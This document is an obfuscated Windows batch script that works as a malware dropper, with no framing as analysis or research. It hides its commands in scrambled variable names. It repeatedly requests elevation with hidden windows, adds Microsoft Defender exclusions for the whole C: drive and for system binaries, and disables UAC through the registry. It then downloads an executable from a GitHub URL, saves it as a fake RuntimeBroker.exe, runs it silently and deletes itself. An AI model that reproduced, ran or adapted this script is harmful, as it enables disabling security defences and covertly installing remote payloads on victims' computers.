@echo off & setlocal enableDelayedExpansion
set "nLbD=>nul" & set "gbwwd=NET" & set "DPl=2>&1" & set "Urm=SESSION"
%gbwwd% %Urm% %nLbD% %DPl%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "PanH=bar" & set "rrs=qux" & set "zKK=baz" & set "khGjI=foo" & rem YPmk vqcZ Lcu
set "kzSXj=powershell -ExecutionPolicy Bypass -Command"
set "dGHO=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "KaM='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "LvAOO='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!kzSXj! "!dGHO! !KaM! !LvAOO!" %nLbD% %DPl%
set "VQFa=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "BriIY=-Name 'EnableLUA' -Value 0"
!kzSXj! "!VQFa! !BriIY!" %nLbD% %DPl%
set "aVi=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!kzSXj! "!aVi!" %nLbD% %DPl%
if !errorlevel! neq 0 (goto %a%)
set "XjPdx=timeout /t" & !XjPdx! 2 %nLbD% %DPl%
set "qnev=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "AXB=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "QSnD=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!kzSXj! "!qnev! !AXB! !QSnD!" %nLbD% %DPl%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!XjPdx! 1 %nLbD% %DPl% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %nLbD% %DPl%
del /f /q "%~f0" %nLbD% %DPl%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %nLbD% %DPl%
if !errorlevel! neq 0 (!XjPdx! 3 %nLbD% %DPl% & goto %b%)
exit /b
